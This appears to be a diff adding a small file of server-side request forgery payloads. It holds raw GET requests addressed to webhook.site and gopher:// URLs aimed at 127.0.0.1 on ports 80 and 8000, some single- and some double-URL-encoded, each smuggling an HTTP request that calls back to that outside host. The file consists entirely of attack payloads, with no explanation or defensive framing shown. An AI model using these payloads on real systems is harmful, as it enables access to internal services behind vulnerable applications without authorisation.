@@ -1,0 +1,16 @@
+GET /e0997442-9e53-4f41-bcdd-a88ea95e01e8 HTTP/1.1
+Host: webhook.site
+Accept: */*
+
+gopher://127.0.0.1:8000/_GET%20%2F0e1901b0-bc50-40a6-ad1f-a8b6437da7fe%20HTTP%2F1.1%0D%0AHost%3A%20webhook.site%0D%0AAccept%3A%20%2A%2F%2A
+
+gopher://127.0.0.1:8000/_GET%2520%252F0e1901b0-bc50-40a6-ad1f-a8b6437da7fe%2520HTTP%252F1.1%250D%250AHost%253A%2520webhook.site%250D%250AAccept%253A%2520%252A%252F%252A
+
+
+GET /0e1901b0-bc50-40a6-ad1f-a8b6437da7fe HTTP/1.1
+Host: webhook.site
+Accept: */*
+
+gopher://127.0.0.1:80/_GET%20%2F0e1901b0-bc50-40a6-ad1f-a8b6437da7fe%20HTTP%2F1.1%0D%0AHost%3A%20webhook.site%0D%0AAccept%3A%20%2A%2F%2A
+
+gopher://127.0.0.1:80/_GET%2520%252F0e1901b0-bc50-40a6-ad1f-a8b6437da7fe%2520HTTP%252F1.1%250D%250AHost%253A%2520webhook.site%250D%250AAccept%253A%2520%252A%252F%252A
